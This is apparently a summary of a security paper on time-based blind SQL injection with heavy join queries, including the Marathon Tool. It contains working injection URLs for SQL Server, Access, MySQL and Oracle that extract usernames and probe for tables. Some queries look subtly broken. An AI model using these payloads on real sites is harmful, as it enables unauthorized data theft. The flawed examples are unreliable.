# Time-Based Blind SQL Injection using Heavy Queries & Marathon Tool

## 1. Introduction
This document demonstrates how to perform a time-based blind SQL injection attack using heavy queries on various database engines, including Microsoft SQL Server, Microsoft Access, MySQL, and Oracle. The technique leverages the response time of the server to infer the presence or absence of specific data.

## 2. Examples of Time-Based Blind SQL Injection

### 2.1 Microsoft SQL Server 2000
The following examples illustrate how to use heavy queries to extract information from a Microsoft SQL Server 2000 database. The `sysusers` table is used for this purpose.

#### Example 1: Extracting the First Character of a Username
```sql
http://www.informatica64.com/blind2/pista.aspx?id_pista=1 
AND (SELECT count(*) FROM sysusers AS sys1, sysusers AS sys2, sysusers AS sys3, sysusers AS sys4, sysusers AS sys5, 
sysusers AS sys6, sysusers AS sys7, sysusers AS sys8) > 1 
AND 118 > (SELECT TOP 1 ASCII(SUBSTRING(name, 1, 1)) FROM sysusers)
```

If the query returns `FALSE`, it means that the ASCII value of the first character of the username is greater than 118. By incrementing the ASCII value, we can determine the exact character.

#### Example 2: Extracting the Second Character of a Username
```sql
http://www.informatica64.com/blind2/pista.aspx?id_pista=1 
AND (SELECT count(*) FROM sysusers AS sys1, sysusers AS sys2, sysusers AS sys3, sysusers AS sys4, sysusers AS sys5, 
sysusers AS sys6, sysusers AS sys7, sysusers AS sys8) > 1 
AND 150 > (SELECT TOP 1 ASCII(SUBSTRING(name, 2, 1)) FROM sysusers)
```

### 2.2 Microsoft Access 2000
Microsoft Access 2000 databases contain a table called `MSysAccessObjects` which stores information about the objects in the database. This table can be used for time-based blind SQL injection.

#### Example: Heavy Query with Delay
```sql
http://www.informatica64.com/retohacking/pista.aspx?id_pista=1 
AND (SELECT count(*) FROM MSysAccessObjects AS T1, MSysAccessObjects AS T2, MSysAccessObjects AS T3, 
MSysAccessObjects AS T4, MSysAccessObjects AS T5, MSysAccessObjects AS T6, 
MSysAccessObjects AS T7, MSysAccessObjects AS T8, MSysAccessObjects AS T9, MSysAccessObjects AS T10) > 0 
AND EXISTS (SELECT * FROM contrasena)
```

This query introduces a delay of six seconds if the condition is true, allowing the attacker to infer the presence of the `contrasena` table.

### 2.3 MySQL 5
MySQL 5.x includes a new schema called `Information_Schema` which can be used for time-based blind SQL injection.

#### Example: Heavy Query with Delay
```sql
http://www.kachakil.com/pista.aspx?id_pista=1 
AND EXISTS (SELECT * FROM contrasena) 
AND 100 > (SELECT count(*) FROM information_schema.columns, information_schema.columns T1, information_schema T2)
```

This query introduces a delay of 30 seconds if the condition is true, allowing the attacker to infer the presence of the `contrasena` table.

### 2.4 Oracle
Oracle databases include a view called `all_users` which can be used for time-based blind SQL injection.

#### Example: Extracting the First Character of a Username
```sql
http://blind.elladodelmal.com/oracle/pista.aspx?id_pista=1 
AND (SELECT count(*) FROM all_users t1, all_users t2, all_users t3, all_users t4, all_users t5) > 0 
AND 300 > (ASCII(SUBSTR((SELECT username FROM all_users WHERE rownum = 1), 1, 1)))
```

This query introduces a delay of 40 seconds if the condition is true, allowing the attacker to infer the ASCII value of the first character of the username.

## 3. Heavy Queries
Time-based blind SQL injection can be performed by using any heavy query. The key is to know or guess the name of a table with recorded data. The perimeter protection countermeasures, such as disabling access to stored procedures or benchmark functions, do not protect against these attacks. Secure coding practices are essential to prevent such vulnerabilities.

## 4. Marathon Tool
Marathon Tool is a proof-of-concept (POC) tool for performing time-based blind SQL injection attacks using heavy queries. It supports Microsoft SQL Server, MySQL, and Oracle databases.

### 4.1 Configuration Section
- **Database Engine**: Select the database engine (Microsoft SQL Server, MySQL, or Oracle).
- **Target Base URL**: Enter the web application URL and connection details.
- **Parameters**: Specify GET or POST parameters, and identify injectable parameters.
- **Cookies**: Configure cookie variables and values.
- **Authentication**: Set up user credentials for the web application.
- **Proxy**: Configure an HTTP proxy.
- **Start Injection with and End Injection with**: Configure prefix and suffix values for the injection test.

### 4.2 Injection Options
- **Min Heavy Query Time**: Set the minimum time difference between true and false responses.
- **HTTP Request Timeout**: Set the timeout for HTTP requests.
- **Request Tests Count**: Specify the number of tests to confirm a true response.
- **Pause After Heavy Query**: Set the pause time after each heavy query.
- **Pause After Any Query**: Set the pause time after any query.
- **Minimum Joins for Queries**: Set the initial number of tables for joins.
- **Maximum Joins for Queries**: Set the maximum number of tables for joins.
- **Enable Equal Sign in Selects**: Choose whether to use relational or equal operators.
- **Heavy Queries Tables**: Specify the tables to use for constructing heavy queries.

### 4.3 Database Schema
This section displays the information collected from the web application using time-based blind SQL injection with heavy queries.

### 4.4 Debug Log Section
This panel shows the queries sent to the web application and their results. It helps in analyzing the behavior of the web application and tuning the tool.

## 5. References
- [1] “(More) Advanced SQL Injection”. Chris Anley. NGS Software. URL: http://www.nextgenss.com/papers/more_advanced_sql_injection.pdf
- [2] “Blindfolded SQL Injection”. Ofer Maor and Amichai Shulman. Imperva. URL: http://www.imperva.com/application_defense_center/white_papers/blind_sql_server_injection.html
- [3] “Blind SQL Injection Automation Techniques”. Cameron Hotchkies. BlackHat Conferences. URL: https://www.blackhat.com/presentations/bh-usa-04/bh-us-04-hotchkies/bh-us-04-hotchkies.pdf
- [4] “Absinthe”. Cameron Hotchkies. 0x90. URL: http://www.0x90.org/releases/absinthe/download.php
- [5] “Data Mining with SQL Injection and Inference”. David Litchfield. NGS Software. URL: http://www.ngssoftware.com/research/papers/sqlinference.pdf
- [6] “SQL Injection Cheat Sheet”. Ronald van den Heetkamp. 0x000000. URL: http://www.0x000000.com/?i=14&bin=1110
- [7] “Solar Empire’s Exploit”. Blackhawk. Milw0rm. URL: http://www.milw0rm.com/exploits/4078
- [8] “…a SQL Server Injection & takeover tool… ”. icesurfer. SQLNinja. URL: http://sqlninja.sourceforge.net
- [9] “SQL PowerInjector”. Francois Larouche. SQL PowerInjector. URL: http://www.sqlpowerinjector.com

## 6. Authors
- **Chema Alonso**: Computer Engineer, Security Consultant, and Microsoft MVP.
- **Daniel Kachakil**: Systems Engineer and Master in Software Engineering.
- **Rodolfo Bordón**: Software Specialist Technician and System Security Consultant.
- **Antonio Guzmán**: Assistant Professor, Department of Computer Architecture and Technology, Rey Juan Carlos University.
- **Marta Beltrán**: Titular Professor, Rey Juan Carlos University.